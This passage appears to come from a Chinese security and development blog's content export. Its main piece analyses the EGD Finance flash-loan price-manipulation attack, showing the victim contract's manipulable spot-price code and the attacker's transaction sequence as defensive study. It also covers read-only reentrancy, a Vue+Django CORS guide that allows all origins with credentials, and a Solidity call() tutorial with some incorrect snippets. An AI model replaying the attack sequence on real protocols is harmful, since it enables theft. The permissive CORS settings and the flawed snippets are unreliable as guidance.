</ol>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401211559941.png" alt="image-20240121155918090"></p>
<h2 id="攻击原因分析："><a href="#攻击原因分析：" class="headerlink" title="攻击原因分析："></a>攻击原因分析：</h2><p>Read-only Reentrancy：攻击者调用一个项目合约中，攻击者操纵了合约中的一个状态，这时回调到了攻击者，另一个项目合约的状态依赖于该合约，这时攻击者回调进入另一合约，进行不当获利。</p>
<ul>
<li>Balancer项目在添加或移除流动性的时候，都是先进行LPtoken的余额变化，后进行转账，再更新池子余额，转账ETH，会进入攻击合约的fallback函数</li>
<li>而在Sentiment协议中，用户抵押后能贷款的数量，是一定程度依赖于Balancer，而Balancer并未及时更新，被攻击者操作，导致比质押更多的资产被借出。</li>
</ul>
<p>ROR与典型重入的关键不同是，ROR不是发生在一个合约中，不是重入同一个合约，这样通过序列判断的方式就不太可能实现</p>
]]></content>
      <categories>
        <category>Defi安全</category>
        <category>安全事件分析</category>
      </categories>
      <tags>
        <tag>Defi安全</tag>
        <tag>安全事件分析</tag>
      </tags>
  </entry>
  <entry>
    <title>EGD价格操纵攻击原理分析--phalcon+etherscan</title>
    <url>/2023/12/19/EGD%E4%BB%B7%E6%A0%BC%E6%93%8D%E7%BA%B5%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="EGD攻击事件相关信息"><a href="#EGD攻击事件相关信息" class="headerlink" title="EGD攻击事件相关信息"></a>EGD攻击事件相关信息</h2><p>发生在BSC上</p>
<ul>
<li><p>攻击者地址：<a href="https://bscscan.com/address/0xee0221d76504aec40f63ad7e36855eebf5ea5edd">Address 0xee0221d76504aec40f63ad7e36855eebf5ea5edd | BscScan</a></p>
</li>
<li><p>攻击合约：<a href="https://bscscan.com/address/0xc30808d9373093fbfcec9e026457c6a9dab706a7">Contract Address 0xc30808d9373093fbfcec9e026457c6a9dab706a7 | BscScan</a></p>
</li>
<li><p>攻击交易：<a href="https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3">BNB Smart Chain Transaction Hash (Txhash) Details | BscScan</a></p>
</li>
<li><p>受害合约的地址：<a href="https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code">EGD_Finance | Address 0x93c175439726797dcee24d08e4ac9164e88e7aee | BscScan</a></p>
</li>
</ul>
<h2 id="EGD-Finance代码分析及攻击流程讲解"><a href="#EGD-Finance代码分析及攻击流程讲解" class="headerlink" title="EGD-Finance代码分析及攻击流程讲解"></a>EGD-Finance代码分析及攻击流程讲解</h2><p>EGD_Finance合约的调用都是通过代理合约进行调用</p>
<p>在区块链浏览器上点击“Read as Proxy”可以查看到最终的合约。</p>
<p><code>EGD Finance</code>合约中实现的主要功能就是<strong>质押USDT一段时候，可提取奖励EGD token</strong>，相当于银行存款，存一段时间之后可以提取利息。</p>
<p>下面质押步骤和兑换奖励步骤都是攻击者真实发起的交易步骤</p>
<h3 id="质押步骤"><a href="#质押步骤" class="headerlink" title="质押步骤"></a>质押步骤</h3><p><a href="https://bscscan.com/address/0xbc5e8602c4fba28d0efdbf3c6a52be455d9558f5">Address 0xbc5e8602c4fba28d0efdbf3c6a52be455d9558f5 | BscScan</a> 调用攻击合约的<code>stake()</code>函数进行相应的抵押操作，该地址应该也是攻击者地址，其创建了攻击合约</p>
<p>具体交易如下：<a href="https://bscscan.com/tx/0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8">BNB Smart Chain Transaction Hash (Txhash) Details | BscScan</a></p>
<p>我们可以在Phalcon上看到该交易的具体调用信息：</p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312191601130.png" alt="image-20231219160115062"></p>
<p>这里进一步进行分析：</p>
<p><a href="https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code">EGD_Finance | Address 0x93c175439726797dcee24d08e4ac9164e88e7aee | BscScan</a>中<code>bond()</code>函数应该只是填写以下邀请人，应该跟web2一样，每个地址的邀请人和质押收益相关</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function bond(address invitor) external &#123;        </span><br><span class="line">        require(userInfo[msg.sender].invitor == address(0), &#x27;have invitor&#x27;);</span><br><span class="line">        require(userInfo[invitor].invitor != address(0) || invitor == fund, &#x27;wrong invitor&#x27;);</span><br><span class="line">        userInfo[msg.sender].invitor = invitor;</span><br><span class="line">        userInfo[invitor].refer ++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>接下来的<code>swapETHForExactTokens()</code>调用是Defi中很常见的代币交换操纵，通过地址看源码，其与uniswap_v2的对应函数一致</p>
<p>从名称中可以看出是向通过不确定数量的ETH来换取一定数量的代币，可以确定交换的是USDT</p>
<p>uniswap的参数列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function swapETHForExactTokens(</span><br><span class="line">    uint amountOut, // 交易获得的代币数量</span><br><span class="line">    address[] calldata path, // 交易路径列表</span><br><span class="line">    address to, // 交易获得的 token 发送到的地址</span><br><span class="line">    uint deadline // 过期时间</span><br><span class="line">) external virtual override payable ensure(deadline) returns (</span><br><span class="line">    uint[] memory amounts // 交易期望数量列表</span><br><span class="line">)&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://bscscan.com/address/0x10ed43c718714eb63d5aa57b78b54704e256024e#readProxyContract">PancakeSwap: Router v2 | Address 0x10ed43c718714eb63d5aa57b78b54704e256024e | BscScan</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)</span><br><span class="line">    external</span><br><span class="line">    virtual</span><br><span class="line">    override</span><br><span class="line">    payable</span><br><span class="line">    ensure(deadline)</span><br><span class="line">    returns (uint[] memory amounts)</span><br><span class="line">&#123;</span><br><span class="line">	//检查是否为WETH进行交换</span><br><span class="line">    require(path[0] == WETH, &#x27;PancakeRouter: INVALID_PATH&#x27;);</span><br><span class="line">    // 从library中获知得到amountOut数量的USDT，需要多少ETH</span><br><span class="line">    amounts = PancakeLibrary.getAmountsIn(factory, amountOut, path);</span><br><span class="line">    //发给pancake的ETH必须大于所需数量</span><br><span class="line">    require(amounts[0] &lt;= msg.value, &#x27;PancakeRouter: EXCESSIVE_INPUT_AMOUNT&#x27;);</span><br><span class="line">    // 将 WETH 换成 ETH（对应phalcon的操作）</span><br><span class="line">    IWETH(WETH).deposit&#123;value: amounts[0]&#125;();</span><br><span class="line">    // 将 amounts[0] 数量的 path[0] 代币从用户账户中转移到 path[0], path[1] 的流动池</span><br><span class="line">    assert(IWETH(WETH).transfer(PancakeLibrary.pairFor(factory, path[0], path[1]), amounts[0]));</span><br><span class="line">    // 按 path 列表执行交易集合，不细究了，之后再详细看uniswap-qwq</span><br><span class="line">    _swap(amounts, path, to);</span><br><span class="line">    // 返回多余的ETH</span><br><span class="line">    if (msg.value &gt; amounts[0]) TransferHelper.safeTransferETH(msg.sender, msg.value - amounts[0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后调用代理合约的<code>stake()</code>函数，质押100个USDT，从Phalcon中的调用记录可看出，具体函数代码不进行分析了，主要是记录了很多相关信息，用于后续的奖励计算，可见<a href="https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code">EGD_Finance | Address 0x93c175439726797dcee24d08e4ac9164e88e7aee | BscScan</a></p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312191624242.png" alt="image-20231219162437653"></p>
<h3 id="兑换奖励步骤"><a href="#兑换奖励步骤" class="headerlink" title="兑换奖励步骤"></a>兑换奖励步骤</h3><p><a href="https://bscscan.com/address/0xee0221d76504aec40f63ad7e36855eebf5ea5edd">Address 0xee0221d76504aec40f63ad7e36855eebf5ea5edd | BscScan</a>攻击者调用攻击合约的<code>harvest()</code>函数进行相应的兑换奖励，phalcon的交易分析如下图所示：</p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312191628484.png" alt="image-20231219162808682"></p>
<p>首先调用合约的<code>calculateAll()函数</code>对用户的质押奖励进行计算，计算用户总共能得到多少收益</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function calculateReward(address addr, uint slot) public view returns (uint)&#123;</span><br><span class="line">    UserSlot memory info = userSlot[addr][slot];</span><br><span class="line">    if (info.leftQuota == 0) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    uint totalRew = (block.timestamp - info.claimTime) * info.rates;</span><br><span class="line">    if (totalRew &gt;= info.leftQuota) &#123;</span><br><span class="line">        totalRew = info.leftQuota;</span><br><span class="line">    &#125;</span><br><span class="line">    return totalRew;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>随后用户就展开了闪电贷操作，</p>
<p>先是通过<code>PancakeSwap</code>（0x16b9a82891338f9ba80e2d6970fdda79d1eb0dae）调用<code>swap()函数</code>借到200个USDT，随后乐观转账，回调攻击合约的<code>pancakeCall()函数</code>可见之前的闪电贷分析文章。</p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401241502690.png" alt="image-20240124150152057"></p>
<p>在<code>pancakecall()函数中</code>又发起闪电贷，从<code>Pancake LPs</code>（0xa361433e409adac1f87cdf133127585f8a93c67d）中调用<code>swap()函数</code>借到424456个USDT，再次回调到<code>pancakeCall()函数</code>中，这是用户调用<code>claimAllReward()函数</code>兑换自己之前质押的奖励。</p>
<blockquote>
<p>为什么在这里兑换奖励，应该很明显能够猜到是因为，闪电贷的大笔金额影响了奖励的计算方法，这里应该是计算质押奖励的函数出现了漏洞问题。</p>
</blockquote>
<p>下面去<a href="https://bscscan.com/address/0x10ed43c718714eb63d5aa57b78b54704e256024e#readProxyContract">PancakeSwap: Router v2 | Address 0x10ed43c718714eb63d5aa57b78b54704e256024e | BscScan</a>项目的<code>claimAllReward()</code>中看一下具体源码，进行了详细的注释：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function claimAllReward() external &#123;</span><br><span class="line">		//判断是否存在对应的质押</span><br><span class="line">       require(userInfo[msg.sender].userStakeList.length &gt; 0, &#x27;no stake&#x27;);</span><br><span class="line">       require(!black[msg.sender],&#x27;black&#x27;);</span><br><span class="line">       //获取质押时的，一系列质押记录，包括金额、时间戳等等</span><br><span class="line">       uint[] storage list = userInfo[msg.sender].userStakeList;</span><br><span class="line">       uint rew;</span><br><span class="line">       uint outAmount;</span><br><span class="line">       uint range = list.length;</span><br><span class="line">       //计算对应的奖励</span><br><span class="line">       for (uint i = 0; i &lt; range; i++) &#123;</span><br><span class="line">           UserSlot storage info = userSlot[msg.sender][list[i - outAmount]];</span><br><span class="line">           require(info.totalQuota != 0, &#x27;wrong index&#x27;);</span><br><span class="line">           //不能超过一个最大奖励</span><br><span class="line">           uint quota = (block.timestamp - info.claimTime) * info.rates;</span><br><span class="line">           if (quota &gt;= info.leftQuota) &#123;</span><br><span class="line">               quota = info.leftQuota;</span><br><span class="line">           &#125;</span><br><span class="line">           //关键步骤，计算对应的奖励，仔细看一下getEGDPrice()函数</span><br><span class="line">           //根据EGD的价格，来确定奖励多少EGD</span><br><span class="line">           rew += quota * 1e18 / getEGDPrice();</span><br><span class="line">           //下面是一些计算账户剩下最大奖励，以及账户余额（+利息）等操作</span><br><span class="line">           info.claimTime = block.timestamp;</span><br><span class="line">           info.leftQuota -= quota;</span><br><span class="line">           info.claimedQuota += quota;</span><br><span class="line">           if (info.leftQuota == 0) &#123;</span><br><span class="line">               userInfo[msg.sender].totalAmount -= info.totalQuota;</span><br><span class="line">               delete userSlot[msg.sender][list[i - outAmount]];</span><br><span class="line">               list[i - outAmount] = list[list.length - 1];</span><br><span class="line">               list.pop();</span><br><span class="line">               outAmount ++;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       //更新相应的质押列表</span><br><span class="line">       userInfo[msg.sender].userStakeList = list;</span><br><span class="line">       //发送响应的奖励</span><br><span class="line">       EGD.transfer(msg.sender, rew);</span><br><span class="line">       userInfo[msg.sender].totalClaimed += rew;</span><br><span class="line">       emit Claim(msg.sender,rew);</span><br><span class="line">   &#125;</span><br><span class="line">   function getEGDPrice() public view returns (uint)&#123;</span><br><span class="line">   	//可在phalcon上看到行营的记录</span><br><span class="line">       uint balance1 = EGD.balanceOf(pair);</span><br><span class="line">       uint balance2 = U.balanceOf(pair);</span><br><span class="line">       //EGD的价格仅仅是根据两种代币的实时数量（流动性）来进行计算，可以被攻击者操纵</span><br><span class="line">       return (balance2 * 1e18 / balance1);</span><br><span class="line">   &#125;</span><br><span class="line">   function initialize() public initializer &#123;</span><br><span class="line">       __Context_init_unchained();</span><br><span class="line">       __Ownable_init_unchained();</span><br><span class="line">       rate = [200, 180, 160, 140];</span><br><span class="line">       startTime = block.timestamp;</span><br><span class="line">       referRate = [6, 3, 1, 1, 1, 1, 1, 1, 2, 3];</span><br><span class="line">       rateList = [547,493,438,383];</span><br><span class="line">       dailyStakeLimit = 1000000 ether;</span><br><span class="line">       wallet = 0xC8D45fF624F698FA4E745F02518f451ec4549AE8;</span><br><span class="line">       fund = 0x9Ce3Aded1422A8c507DC64Ce1a0C759cf7A4289F;</span><br><span class="line">       EGD = IERC20(0x202b233735bF743FA31abb8f71e641970161bF98);</span><br><span class="line">       U = IERC20(0x55d398326f99059fF775485246999027B3197955);</span><br><span class="line">       router = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);</span><br><span class="line">       pair = IPancakeFactory(router.factory()).getPair(address(EGD),address(U));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>EGD的价格是根据两种代币在一个地址上的数量进行计算的，我们在<code>initialize()函数</code>中得到pair地址，pair地址是根据router地址进行计算，router为一个代理合约，在区块链浏览器上我们可以看到pair的地址为0xa361433e409adac1f87cdf133127585f8a93c67d，为pancake的一个提供流动性的合约，是不是有点眼熟。</p>
<p>到这里我们也肯定发现了攻击为什么能成功？</p>
<ul>
<li>用户先通过闪电贷在<code>Pancake LPs</code>0xa361…中借走了大量的USDT，导致<code>Pancake LPs</code>中USDT与EGDpair对中，EGD的价格变得十分便宜。</li>
<li>这时用户在<code>pancakeCall()回调函数</code>中，兑换奖励，奖励的计算是根据<code>Pancake LPs</code>中两种代币的数量进行计算EDG价格，导致EDG的价格很便宜，这是看到<code>rew</code>的计算公式，用户获得超额奖励。</li>
</ul>
<p>下面简单介绍一下，phalcon上后续的调用：</p>
<p>先将<code>Pancake LPs</code>上借用的闪电贷归还；随进行了相应的k值验证（确保还款=原款+手续费）</p>
<p>随后在<code>PancakeSwap: WBNB-BSC-USD 2</code>借用的闪电贷，进行相应的approve授权</p>
<p>调用swapExactTokensForTokensSupportingFeeOnTransferTokens函数将得到的EGD全部兑换成USDT</p>
<p>随后<code>PancakeSwap: WBNB-BSC-USD 2</code>借用的闪电贷归还，并进行相应的k值验证</p>
<p>最后攻击者获利36044 USDT</p>
<h3 id="污点分析的方式为什么能够进行检测？"><a href="#污点分析的方式为什么能够进行检测？" class="headerlink" title="污点分析的方式为什么能够进行检测？"></a>污点分析的方式为什么能够进行检测？</h3><p>针对脆弱的询价机制，该种机制中某种代币的计算是根据其它代币的余额</p>
<ul>
<li>taint source：代表代币的余额，能够被攻击者之间或间接的进行操纵，这时攻击者就能够操作代币的余额</li>
<li>taint sink：转账的操作，Defi交易中，最终将具体的收益或金额转给用户，判断这里的转账地址能够被攻击者操纵</li>
<li>source与sink之间存在路径：说明某种代币的余额能够被攻击者所操纵（能够被闪电贷操纵），并且收益或转账金额是于该代币余额有关（说明金融模型询价机制的脆弱），并且最终的收款地址能被攻击者操纵。</li>
</ul>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202403051546677.png" alt="image-20240305154652135"></p>
]]></content>
      <categories>
        <category>Defi安全</category>
      </categories>
      <tags>
        <tag>Defi安全</tag>
        <tag>安全事件分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue+Django前后端交互跨域</title>
    <url>/2023/12/16/Vue-Django%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92%E8%B7%A8%E5%9F%9F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Vue-Django前后端开发"><a href="#Vue-Django前后端开发" class="headerlink" title="Vue+Django前后端开发"></a>Vue+Django前后端开发</h1><p>当我们从零开始利用Vue和Django开发的时候，就会遇到跨域问题，一般来说Vue本地端口可以是8080或者其它，Django的本地端口一般是8000。<br>虽然在Vue中我们用axios 向8000端口发送http请求，但还是收到跨域访问的限制<br>这里分别从前后端说明该如何配置，解决跨域问题</p>
<h2 id="前端Vue配置"><a href="#前端Vue配置" class="headerlink" title="前端Vue配置"></a>前端Vue配置</h2><h3 id="1-config-index-js"><a href="#1-config-index-js" class="headerlink" title="1. config/index.js"></a>1. config/index.js</h3><p>基于封装好的axios来进行跨域<br>在前端config/index.js中,设置proxy进行跨域<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">devServer</span>:&#123;</span><br><span class="line">      <span class="attr">proxy</span>:&#123;</span><br><span class="line">        <span class="string">&#x27;/api&#x27;</span>:&#123;<span class="comment">//表示拦截以/api开头的请求路径</span></span><br><span class="line">          <span class="attr">target</span>:<span class="string">&#x27;http://127.0.0.1:8000&#x27;</span>,</span><br><span class="line">          <span class="attr">changOrigin</span>: <span class="literal">true</span>,<span class="comment">//是否开启跨域</span></span><br><span class="line">          <span class="attr">pathRewrite</span>:&#123;</span><br><span class="line">            <span class="string">&#x27;^/api&#x27;</span>:<span class="string">&#x27;&#x27;</span> <span class="comment">//重写api，把api变成空字符，因为我们真正请求的路径是没有api的</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="2-axios的封装文件"><a href="#2-axios的封装文件" class="headerlink" title="2. axios的封装文件"></a>2. axios的封装文件</h3><p>建立一个json文件，对axios.create进行封装的时候，将其baseURL设置为api，如下所示<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> http = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">  <span class="attr">baseURL</span>: <span class="string">&#x27;/api&#x27;</span>,</span><br><span class="line">  <span class="attr">timeout</span>: <span class="number">50000</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<h2 id="后端Django配置"><a href="#后端Django配置" class="headerlink" title="后端Django配置"></a>后端Django配置</h2><h3 id="1-安装django-cors-headers库"><a href="#1-安装django-cors-headers库" class="headerlink" title="1. 安装django-cors-headers库"></a>1. 安装django-cors-headers库</h3><p>在python环境下直接pip install 进行安装</p>
<h3 id="2-设置setting-py文件"><a href="#2-设置setting-py文件" class="headerlink" title="2. 设置setting.py文件"></a>2. 设置setting.py文件</h3><p>在setting.py中，在INSTALLED_APPS中添加跨域所需的APP<code>corsheaders</code>,同时在MIDDLEWARE中也添加响应的中间件，并将允许跨域请求的请求方式进行设置，设置为ALL<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">    ......</span><br><span class="line">    <span class="string">&#x27;corsheaders&#x27;</span>,</span><br><span class="line">    ......</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">MIDDLEWARE = [</span><br><span class="line">    ......</span><br><span class="line">    <span class="string">&#x27;corsheaders.middleware.CorsMiddleware&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.middleware.common.CommonMiddleware&#x27;</span>,</span><br><span class="line">    ......</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">CORS_ORIGIN_ALLOW_ALL = <span class="literal">True</span></span><br><span class="line">CORS_ALLOW_CREDENTIALS = <span class="literal">True</span></span><br></pre></td></tr></table></figure><br>如果前后端都进行了这样的设置之后，应该前后端就能够进行数据的交互了！</p>
]]></content>
      <categories>
        <category>前后端</category>
      </categories>
      <tags>
        <tag>前后端</tag>
      </tags>
  </entry>
  <entry>
    <title>Solidity合约调用详解</title>
    <url>/2023/12/16/Solidity%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>最近在做毕设，在slither的基础上搭建一个检测器，需要对solidity中的合约调用范式进行建模，在remix上对合约调用进行了很多尝试qwq，说多了都是泪，故系统总结一下。<br><code>solidity环境：0.8.13</code></p>
<h1 id="1-利用call函数进行合约内的调用。"><a href="#1-利用call函数进行合约内的调用。" class="headerlink" title="1. 利用call函数进行合约内的调用。"></a>1. 利用call函数进行合约内的调用。</h1><p>这里我们不考虑利用call函数进行转账的情况，仅仅考虑利用call函数进行合约间的函数调用。<br>call(）函数调用其他合约或者本合约的函数时，需要有对应的函数标识符进行调用。<br>函数标识符通过abi编码函数生成。<br>这里的环境应该，不出意外的话，只支持<code>encodeWithSignature</code>，<code>encodeWithSelector</code></p>
<ul>
<li>基本的调用方式：</li>
</ul>
<ol>
<li><code>encodeWithSignature</code><br>对函数签名进行keccak256运算后，取前四字节的结果，之后剩下的字节是encode()的结果，将每个数据填充为32字节<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes memory method = abi.encodeWithSignature(&quot;函数名(参数列表)&quot;, 对应的参数列表);</span><br><span class="line">（bool , bytes memory returnData）= address(this) .call(method);</span><br></pre></td></tr></table></figure>
这里以调用自身合约中的一个函数为例进行说明，给出一个实例，在remix上进行了测试。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.13;</span><br><span class="line">//基合约实现</span><br><span class="line">contract TestFallback &#123;</span><br><span class="line">    string message;</span><br><span class="line">    address add;</span><br><span class="line">    uint inter;</span><br><span class="line">    //构造函数，初始化状态变量message</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        message = &quot;hello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        message = &quot;fallback&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function testFallbackWithParam(string memory _message) external returns (bytes memory) &#123;</span><br><span class="line">        bytes memory method = abi.encodeWithSignature(&quot;setMsg(uint)&quot;,_message);</span><br><span class="line">        (bool success, bytes memory returnData) = address(this).call(method);</span><br><span class="line"></span><br><span class="line">        require(success, &quot;set fail&quot;);</span><br><span class="line">        return returnData;</span><br><span class="line">    &#125;</span><br><span class="line">    function setAddr(address a1) external &#123;</span><br><span class="line">        add = a1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getMsg() external view returns (string memory) &#123;</span><br><span class="line">        return message;</span><br><span class="line">    &#125;</span><br><span class="line">    function setMsg(string memory _message) external &#123;</span><br><span class="line">        message = _message;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><code>encodeWithSelector</code><br>其与上面十分相似，可以认为前者是后者的简写，因为它会自动对函数签名先进行keccak256运算再取前四字节。而encodeWithSelector不会.<br>调用方式如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes memory method = abi.encodeWithSignature(bytes4(keccak256(&quot;函数名(参数列表)&quot;)), 对应的参数列表);</span><br><span class="line">（bool , bytes memory returnData）= address(this) .call(method);</span><br></pre></td></tr></table></figure>
因为该函数用法和上面一模一样，这里就不贴在remix上的示例了。</li>
</ol>
</li>
</ol>
<h1 id="这里分享一个踩过的坑，浪费了我一天时间qwq"><a href="#这里分享一个踩过的坑，浪费了我一天时间qwq" class="headerlink" title="这里分享一个踩过的坑，浪费了我一天时间qwq"></a>这里分享一个踩过的坑，浪费了我一天时间qwq</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract B&#123;</span><br><span class="line">    function toeat(address _add , uint a) public&#123;</span><br><span class="line">        bytes memory method =abi.encodeWithSignature(&quot;eat(uint)&quot;,a);</span><br><span class="line">        (bool answer, bytes memory value) = address(cat(_add)).call(method);  //通过bytes32(keccak256(&quot;eat()&quot;指定方法，后面的是参数</span><br><span class="line">        require(answer, &quot;call failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里想调用cat合约中的eat()函数，编码的时候函数名(参数列表)写的是<code>eat(uint)</code>。问题就出在这，solidity有时候会默认uint就是uint256，但是在这里它不知道不默认了！！！！！！！！！，调用toeat()函数的时候，它总是会报错，或者调用到fallback函数，很寄<br>所以应该改成：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract B&#123;</span><br><span class="line">    function toeat(address _add , uint a) public&#123;</span><br><span class="line">        bytes memory method =abi.encodeWithSignature(&quot;eat(uint256)&quot;,a);</span><br><span class="line">        (bool answer, bytes memory value) = address(cat(_add)).call(method);  //通过bytes32(keccak256(&quot;eat()&quot;指定方法，后面的是参数</span><br><span class="line">        require(answer, &quot;call failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="2-利用call函数进行合约间的函数调用"><a href="#2-利用call函数进行合约间的函数调用" class="headerlink" title="2.利用call函数进行合约间的函数调用"></a>2.利用call函数进行合约间的函数调用</h1><p>话不多说，直接先上代码，remix上测试过：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;./testFallbackImport3.sol&quot; ;</span><br><span class="line"></span><br><span class="line">contract Animal&#123;</span><br><span class="line">    cat c;</span><br><span class="line">    constructor(address _add)&#123;</span><br><span class="line">        c = cat(_add);</span><br><span class="line">    &#125;</span><br><span class="line">    function test()public view returns(uint) &#123; //普通实例化合约调用</span><br><span class="line">       return c.eat(1);</span><br><span class="line">   &#125;</span><br><span class="line">    function test2()external returns(bool) &#123;  //通过call方法调用</span><br><span class="line">        bytes memory method =abi.encodeWithSignature(&quot;use(uint256)&quot;,2);</span><br><span class="line">        (bool answer, bytes memory value) = address(c).call(method);  //通过bytes32(keccak256(&quot;eat()&quot;指定方法，后面的是参数</span><br><span class="line">        require(answer, &quot;call failed&quot;);</span><br><span class="line">&#125; &#125;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    function toeat (address _add , uint a) public&#123;</span><br><span class="line">        bytes memory method =abi.encodeWithSignature(&quot;eat(uint256)&quot;,a);</span><br><span class="line">        (bool answer, bytes memory value) = address(cat(_add)).call(method);  //通过bytes32(keccak256(&quot;eat()&quot;指定方法，后面的是参数</span><br><span class="line">        require(answer, &quot;call failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function toeat1(address _add , uint a) public&#123;</span><br><span class="line">        cat chu = cat(_add);</span><br><span class="line">        bytes memory method =abi.encodeWithSignature(&quot;eat(uint256)&quot;,a);</span><br><span class="line">        (bool answer, bytes memory value) = address(chu).call(method);  //通过bytes32(keccak256(&quot;eat()&quot;指定方法，后面的是参数</span><br><span class="line">        require(answer, &quot;call failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function toeat2(cat _add , uint a) public&#123;</span><br><span class="line">        bytes memory method =abi.encodeWithSignature(&quot;eat(uint256)&quot;,a);</span><br><span class="line">        (bool answer, bytes memory value) = address(_add).call(method);  //通过bytes32(keccak256(&quot;eat()&quot;指定方法，后面的是参数</span><br><span class="line">        require(answer, &quot;call failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>test合约，三个函数代表了利用call函数进行合约调用的三种方式：<br><code>toeat()</code><br>传入目标合约的地址，生成目标合约的引用，然后调用目标函数<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function toeat (address _add , uint a) public&#123;</span><br><span class="line">    bytes memory method =abi.encodeWithSignature(&quot;eat(uint256)&quot;,a);</span><br><span class="line">    (bool answer, bytes memory value) = address(cat(_add)).call(method);  //通过bytes32(keccak256(&quot;eat()&quot;指定方法，后面的是参数</span><br><span class="line">    require(answer, &quot;call failed&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><code>toeat1()</code><br>创建合约变量，然后利用它来调用目标函数<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function toeat1(address _add , uint a) public&#123;</span><br><span class="line">    cat chu = cat(_add);</span><br><span class="line">    bytes memory method =abi.encodeWithSignature(&quot;eat(uint256)&quot;,a);</span><br><span class="line">    (bool answer, bytes memory value) = address(chu).call(method);  //通过bytes32(keccak256(&quot;eat()&quot;指定方法，后面的是参数</span><br><span class="line">    require(answer, &quot;call failed&quot;);</span><br><span 